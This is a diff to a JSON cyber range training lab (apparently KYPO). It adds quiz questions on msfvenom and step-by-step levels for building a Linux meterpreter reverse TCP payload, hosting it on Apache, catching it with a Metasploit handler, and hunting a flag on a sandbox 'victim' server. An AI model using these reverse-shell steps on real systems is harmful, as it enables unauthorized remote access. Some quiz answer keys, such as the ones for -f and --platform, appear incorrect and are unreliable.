@@ -16,7 +16,7 @@
     "title" : "Quick Knowledge Test",
     "level_type" : "ASSESSMENT_LEVEL",
     "order" : 1,
-    "estimated_duration" : 8,
+    "estimated_duration" : 12,
     "minimal_possible_solve_time" : null,
     "questions" : [ {
       "question_type" : "MCQ",
@@ -138,6 +138,174 @@
         "correct" : true,
         "order" : 3
       } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "Which msfvenom option is used to specify the payload to be used for generating the reverse shell?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 5,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "-p",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "-l",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "-e",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "-a",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What is the purpose of encoding the payload with msfvenom?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 6,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "To make the payload undetectable by antivirus software.",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "To encrypt the payload to prevent unauthorized access.",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "To compress the payload for faster transmission.",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "To obfuscate the payload to confuse security analysts.",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "In msfvenom, which option is used to specify the number of times the payload should be encoded?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 7,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "-n",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "-i",
+        "correct" : true,
+        "order" : 1
+      }, {
+        "text" : "-e",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "-r",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "To create a payload that is compatible with a specific Linux shell, which msfvenom option should be used?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 8,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : " -b",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : " -f",
+        "correct" : true,
+        "order" : 1
+      }, {
+        "text" : "-p",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "-a",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What does the \"--platform\" option in msfvenom allow you to specify?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 9,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "The architecture of the target system.",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "The operating system on the attacker's machine.",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : "The type of payload to be generated.",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : "The preferred encoding method for the payload.",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "Which msfvenom option is used to specify a custom template file for the generated payload?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 10,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "--template",
+        "correct" : true,
+        "order" : 0
+      }, {
+        "text" : "--encrypt",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : " --format",
+        "correct" : false,
+        "order" : 2
+      }, {
+        "text" : " --template-str",
+        "correct" : false,
+        "order" : 3
+      } ]
+    }, {
+      "question_type" : "MCQ",
+      "text" : "What is the purpose of using a stager in the msfvenom payload generation process?",
+      "points" : 5,
+      "penalty" : 5,
+      "order" : 11,
+      "answer_required" : true,
+      "choices" : [ {
+        "text" : "To enhance the functionality of the payload.",
+        "correct" : false,
+        "order" : 0
+      }, {
+        "text" : "To obfuscate the payload and make it more difficult to detect.",
+        "correct" : false,
+        "order" : 1
+      }, {
+        "text" : " To establish a connection to the target system before delivering the full payload.",
+        "correct" : true,
+        "order" : 2
+      }, {
+        "text" : "To provide additional configuration options for the payload.",
+        "correct" : false,
+        "order" : 3
+      } ]
     } ],
     "instructions" : "Answer questions and move on to next phase.",
     "assessment_type" : "TEST"
@@ -147,8 +315,8 @@
     "order" : 2,
     "estimated_duration" : 0,
     "minimal_possible_solve_time" : null,
-    "passkey" : "start-training",
-    "cloud_content" : "For accessing KYPO virtual machines using your local command-line tool, click on `Get SSH access` button to download ZIP file and then follow the instructions in the [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access). When you are ready to advance to the next phase, submit the answer provided by the organizer.\nOr right-click on the selected network node (host or router) in the network topology will open the menu with the following options :\n\nOpen console: Opens the command-line interface (CLI) in Apache Guacamole application using the SSH protocol. This option is available only for routers and hosts with Linux-based operating systems.\n\nOpen console (deprecated): Opens web browser-based user interface using Spice client. This option is available for all routers and hosts, but it doesn’t support the Copy & paste feature, and the response from the machine may be slow, so it seems that the console is freezing. Therefore it was marked as deprecated and we recommend using the other options to access the sandbox node.\n\nOpen GUI: Opens graphical user interface (GUI) in Apache Guacamole application using the VNC or RDP protocol. This option can be available for all routers and hosts but depends on whether they are properly configured.\n\n# Switch to user:**`client`** and password:**`password`** to proceed the lab.",
+    "passkey" : "start-training-lab-2",
+    "cloud_content" : "Your first task is to access the sandbox, where you will complete all following tasks.\n\n### Sandbox access\n1. In the topology overview on the right, right-click on **`client`** and then click on **`Open console`**, and a new pop-up window will appear. \n2. Login with username **`client`** and password **`password`**. (*You may want to login into the client with multiple session in terminals which maybe easier for doing this lab*)\n3. After you have successfully connected, Submit the answer **`start-training-lab-2`**.\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.\n",
     "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
   }, {
     "title" : "Generate the Reverse Shell Payload",
@@ -158,8 +326,8 @@
     "minimal_possible_solve_time" : null,
     "answer" : "ifconfig",
     "answer_variable_name" : null,
-    "content" : "# Execute the following command to generate the reverse shell payload using msfvenom:\n\n`sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<your IP address> LPORT=<PORT> -f elf -o /var/www/html/shell-x64.elf`\n\n## Q: What the command in CLI Linux OS you use to get your IP address?",
-    "solution" : "ifconfig",
+    "content" : "# Execute the following command to generate the reverse shell payload using msfvenom:\n\n`sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<your IP address> LPORT=<PORT> -f elf -o /var/www/html/shell-x64.elf`\n\n# Explain:\n-p: Specifies the payload to use for generating the shellcode. In this case, linux/x64/meterpreter_reverse_tcp is the payload, which is a reverse TCP meterpreter payload for 64-bit Linux systems.\n\nLHOST: This is a variable that represents your IP address. It should be replaced with your actual IP address.\n\nLPORT: This is a variable that represents the port number on which the meterpreter will listen for incoming connections. It should be replaced with the desired port number. My recommend is using the uncommon PORT.\n\n-f: Specifies the output format of the payload. In this case, elf is the format, which stands for Executable and Linkable Format, commonly used for Linux executables.\n\n-o: Specifies the output file where the generated payload will be saved. In this case, the payload will be saved in the file /var/www/html/shell-x64.elf. The /var/www/html/ directory is often used for serving web content, so this would make the payload accessible via a web server if it's running on the system.\n\n\n## Q: What the command in CLI Linux OS you use to get your IP address?",
+    "solution" : "You can find the answer [here](https://www.ibm.com/docs/en/aix/7.2?topic=i-ifconfig-command)",
     "solution_penalized" : true,
     "hints" : [ ],
     "incorrect_answer_limit" : 10,
@@ -178,8 +346,8 @@
     "minimal_possible_solve_time" : null,
     "answer" : "/var/www/html/",
     "answer_variable_name" : null,
-    "content" : "# In the terminal, execute the following command to start the Apache web server:\n\n`sudo service apache2 start`\n\n## Q: Where is the directory that these content in it to the internet? This can be found in previous step. \n(Format: /dirA/dirB/dirC/)",
-    "solution" : "/var/www/html/",
+    "content" : "# Execute command to start the Apache web server.\n\n\n## Q: Where is the directory that these content in it was hosted by apache to the internet?  \n(Format: /dirA/dirB/dirC/)",
+    "solution" : "# In the terminal, execute the following command to start the Apache web server:\n\n`sudo service apache2 start`\n\n\n# Answer for the main question can be found in previous step.",
     "solution_penalized" : true,
     "hints" : [ ],
     "incorrect_answer_limit" : 10,
@@ -199,7 +367,7 @@
     "answer" : "msfconsole",
     "answer_variable_name" : null,
     "content" : "# In this step, you have to find a command to launch the Metasploit Framework console then execute it.\n\n## Q: The command is also the answer for this step.",
-    "solution" : "msfconsole",
+    "solution" : "You can find the answer [here](https://www.offsec.com/metasploit-unleashed/msfconsole/)",
     "solution_penalized" : true,
     "hints" : [ ],
     "incorrect_answer_limit" : 10,
@@ -218,8 +386,8 @@
     "minimal_possible_solve_time" : null,
     "answer" : "tcp",
     "answer_variable_name" : null,
-    "content" : "# Within the Metasploit console, execute the following commands:\n\n`use exploit/multi/handler`\n\n`set PAYLOAD linux/x64/meterpreter_reverse_tcp`\n\n`set LPORT <PORT that you use in the create reverse shell step>`\n\n`set LHOST <your IP address>`\n\n## Q: What protocol you use for configure the reverse shell? (example for protocol format: http, udp, ftp, ...)",
-    "solution" : "tcp",
+    "content" : "# Within the Metasploit console, execute the following commands:\n\n`use exploit/multi/handler`\n\n`set PAYLOAD linux/x64/meterpreter_reverse_tcp`\n\n`set LPORT <PORT>`\n\n`set LHOST <IP address>`\n\n# Explain:\nuse exploit/multi/handler: This command sets the current context to use the 'exploit/multi/handler' module. This module is responsible for setting up a listener to catch incoming connections from exploited targets.\n\nset PAYLOAD linux/x64/meterpreter_reverse_tcp: This command sets the payload to be used in the exploit to 'linux/x64/meterpreter_reverse_tcp'. It specifies the type of payload that will be delivered to the target system.\n\nset LPORT <PORT>: This command sets the local port (LPORT) for the listener. It specifies the port on which the Metasploit handler will listen for incoming connections from exploited systems.\n\nset LHOST <IP address>: This command sets the local host (LHOST) for the listener. It specifies the IP address of the machine where the Metasploit handler is running.\n\n## Q: What protocol you use for configure this reverse shell? (lowercase)",
+    "solution" : "(Example for protocol format: http, udp, ftp, ...). Now you know the answer!",
     "solution_penalized" : true,
     "hints" : [ ],
     "incorrect_answer_limit" : 10,
@@ -238,10 +406,15 @@
     "minimal_possible_solve_time" : null,
     "answer" : "Top_Secret_Flag",
     "answer_variable_name" : null,
-    "content" : "# Execute the following command to initiate the reverse shell exploit:\n\n`exploit`\n\n# Then wait a few seconds for the server get hijack by your reverse shell code.\n\n## Q: After you get into the victim (server) machine, you must find a flag to submit it. It lays around somewhere at home folder.",
-    "solution" : "Top_Secret_Flag",
+    "content" : "# Initiate the reverse shell exploit.\n\n# Then wait a few seconds for the server get hijack by your reverse shell code.\n\n## Q: After you get into the victim (server) machine, you must find a flag to submit it. ",
+    "solution" : "# Execute the following command to initiate the reverse shell exploit:\n\n`exploit`\n\n# The flag is lays around somewhere at /home/ folder.",
     "solution_penalized" : true,
-    "hints" : [ ],
+    "hints" : [ {
+      "title" : "Hint for flag",
+      "content" : "The author like the song 'Sweet /home/ Alabama' . Maybe you find your ~~g4lf~~self interested in it too.",
+      "hint_penalty" : 5,
+      "order" : 0
+    } ],
     "incorrect_answer_limit" : 10,
     "attachments" : [ ],
     "max_score" : 15,
@@ -251,6 +424,6 @@
     "expected_commands" : [ ],
     "commands_required" : false
   } ],
-  "estimated_duration" : 58,
+  "estimated_duration" : 62,
   "variant_sandboxes" : false
 }
